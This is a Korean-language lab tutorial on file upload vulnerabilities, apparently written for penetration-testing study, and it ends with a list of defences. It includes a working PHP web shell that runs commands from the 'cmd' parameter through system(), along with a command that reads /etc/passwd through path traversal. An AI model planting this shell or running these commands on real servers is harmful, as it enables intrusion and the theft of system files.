# 파일 업로드 모의해킹
파일 업로드 모의해킹은 웹 사이트에서 파일을 업로드할 때, 업로드 된 파일이 악성 코드를 포함하고 있는지 확인하지 않아 발생하는 보안 취약점입니다.

## 공격 실습

![file_upload](https://github.com/Tree1st/HK/blob/master/webH/image/fileUpload/file_upload.png)

공격에 사용될 웹쉘 파일을 업로드 합니다. 웹쉘(Web Shell)은 웹을 통해 원격에서 서버에 접근하여 명령어를 실행할 수 있는 프로그램입니다. 웹쉘은 서버의 취약점으로부터 공격자가 접근한 후, 웹상에서 명령어를 실행하고 서버를 제어할 수 있습니다.

다음은 웹쉘 코드(webshell.php)의 예시 입니다.
```php
<?php

echo 'Enter a Command:<br>';
echo '<form action="">';
echo '<input type=text name="cmd">';
echo '<input type="submit">';
echo '</form>';					

/*
	echo 부분은 명령어를 입력받을 수 있는 폼을 제공
    공격자가 입력 폼에 명령어를 입력하면 cmd 파라미터를 통해 전달된다.
*/

if(isset($_GET['cmd'])){
	system($_GET['cmd']);
}
//system 함수를 통해 전달된 명령어가 실행된다.

?>
```

업로드된 파일의 다운로드 주소를 살펴보면 `http://192.168.219.180/upfiledata/webshell.php` 이와같이 설정되어있음을 알 수 있습니다.    
이 주소로 이동하면 다음과같이 명령어를 실행시킬 수 있는 웹쉘이 실행됨을 볼 수 있습니다.
<br><br>

![file_upload_webshell](https://github.com/Tree1st/HK/blob/master/webH/image/fileUpload/file_upload_webshell.png)

위와같이 입력란에 `cat ../../../../../etc/passwd` 를 입력하여 passwd 파일을 탈취할 수 있습니다.

## 방어 방법
- 파일 확장자 제한 : 업로드 가능한 파일 확장자를 제한함으로써, 일반적인 파일 형식이 아닌 파일은 업로드가 불가능하도록 할 수 있습니다.
- 파일 크기 제한 : 업로드 가능한 파일의 최대 크기를 제한함으로써, 대용량 파일의 업로드를 방지할 수 있습니다.
- 파일 유형 검사 : 업로드된 파일을 검사하여, 악성 코드를 포함하고 있는지 여부를 판단하여 업로드를 차단하도록 할 수 있습니다.
- 파일 이름 변경 : 업로드된 파일의 이름을 무작위로 변경하여, 악성 코드가 실행되지 않도록 할 수 있습니다.
